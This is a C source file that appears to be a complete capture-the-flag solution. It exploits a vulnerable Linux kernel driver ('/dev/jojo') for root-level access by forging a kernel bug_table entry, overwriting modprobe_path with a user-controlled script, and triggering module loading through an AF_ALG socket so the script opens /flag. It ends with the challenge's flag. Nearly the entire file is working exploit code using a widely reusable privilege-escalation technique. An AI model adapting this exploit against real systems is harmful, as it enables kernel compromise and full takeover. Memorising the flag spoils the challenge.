#define _GNU_SOURCE
#include <sys/ioctl.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#include <sys/sendfile.h>
#include <sys/resource.h>
#include <sys/stat.h>

#include <sys/socket.h>
#include <linux/if_alg.h>


typedef unsigned long long int u64;
// for inline assembly
volatile u64 asm_fd;
volatile u64 asm_child_fd;
volatile u64 asm_target;
volatile u64 asm_child_target;

volatile u64 MODPROBE_QWORD0;
volatile u64 MODPROBE_QWORD1;
volatile u64 MODPROBE_QWORD2;

#define MODPROBE 0xffffffff82f4aec0

// small delay without calling a syscall (sleep)
static void small_delay(unsigned long n) {
    for (volatile unsigned long i = 0; i < n; i++) {
        asm volatile("pause" ::: "memory");
    }
}

// dont forget to change the paths for your environment 
void make_modprobe_script(void) {
    int fd = open("/home/user/y", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (fd < 0) return;

    const char script[] =
        "#!/bin/sh\n"
        "chmod 777 /flag\n";

    write(fd, script, sizeof(script) - 1);
    close(fd);

    chmod("/home/user/y", 0777);
}

void make_binfmt_trigger(void) {
    int fd = open("/home/user/x", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (fd >= 0) {
        static const unsigned char bad[] = { 0xff, 0xff, 0xff, 0xff, '\n' };
        write(fd, bad, sizeof(bad));
        close(fd);
        chmod("/home/user/x", 0777);
    }
}

// overwrites modprobe path
void child_irq_writer(){
    int child_fd = open("/dev/jojo", 0644, 0);
    asm_child_target = MODPROBE + 0xa8;
    asm_child_fd = (u64) child_fd;

    MODPROBE_QWORD0 = 0x73752f656d6f682f;
    MODPROBE_QWORD1 = 0x00000000792f7265;

    asm volatile(
        "movq MODPROBE_QWORD1(%%rip), %%r14\n"
        "movq MODPROBE_QWORD0(%%rip), %%r15\n"
        "xor %%r8, %%r8\n"
        "xor %%r9, %%r9\n"
        "xor %%r10, %%r10\n"
        "xor %%r11, %%r11\n"
        "xor %%r12, %%r12\n"
        "xor %%r13, %%r13\n"
        "movq asm_child_fd(%%rip), %%rdi\n"
        "movq asm_child_target(%%rip), %%rdx\n"
        "mov $16, %%eax\n"
        "syscall\n"
        "1:\n"
        "pause\n"
        "jmp 1b\n"
        :
        :
        : "rax","rbx","rcx","rdx","rdi","rsi",
      "r8","r9","r10","r11","r12","r13","r14","r15","memory"
      );
}


void read_flag(){
    int fd_f;
    fd_f = open("/flag", O_RDONLY);
    if (fd_f == -1)
        puts("failed");
    sendfile(1, fd_f, NULL, 0x50);
}

// trigger alg_bind -> request_module
int trigger(){
        int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
        struct sockaddr_alg sa;
        if (alg_fd < 0) {
                perror("socket(AF_ALG) failed");
                return 1;
        }

        memset(&sa, 0, sizeof(sa));
        sa.salg_family = AF_ALG;
        strcpy((char *)sa.salg_type, "peroperopero");
        bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
        return 0;
}

int child_stage(){
    small_delay(2000000);
    puts("child is running\n");
    pid_t pid3 = fork();
    if (pid3 == 0) {
        small_delay(10000); // make sure its done overwriting modprobe
        trigger();
        read_flag();
        _exit(0);
    }
    child_irq_writer();
    _exit(0);
}

int main(){
    // modprobe set up
    make_modprobe_script();
    make_binfmt_trigger();
    int fd = open("/dev/jojo", 0644, 0);
    asm_fd = (u64) fd;

    // child overwrites modprobe, triggers binfmt and reads the flag to stdout
    pid_t pid = fork();
    if (pid == 0) {
        child_stage();
    }
    // parent fakes a bug_entry in the bug_table to mark the entry for the irqentry_enter+151 (ud2) as "done".
    // so it returs early without triggering a call to warn().
    u64 target = 0xffffffff830ef3c0 + 0xa8; // ___start____bug_table, 0xa8 is the offset for r15
    asm_target = target;

    asm volatile(
        "xor %%r10, %%r10\n"
        "xor %%r11, %%r11\n"
        "xor %%r12, %%r12\n"
        "xor %%r13, %%r13\n"
        "movabs $0x0007000044444444, %%r14\n"   // mark the bug_entry for irqentry_enter+151 as done.
        "movabs $0x00000000ff3060b7, %%r15\n"
        "movq asm_fd(%%rip), %%rdi\n"
        "movq asm_target(%%rip), %%rdx\n"
        "mov $16, %%eax\n"
        "syscall\n"
        "1:\n"
        "pause\n"
        "jmp 1b\n" // block execution so it does not call do_syscall_64
                   // you can also mark the bug_entry for do_syscall_64+0x3f9 as done too
        :
        :
        : "rax","rbx","rcx","rdx","rdi","rsi",
      "r8","r9","r10","r11","r12","r13","r14","r15","memory"
    );
    return 0;
    // FLAG: CTFA{w4rn1ngs_4r3_jus7_sugg3st10ns-n3v3r-p4n1c-0n-th3m}
}
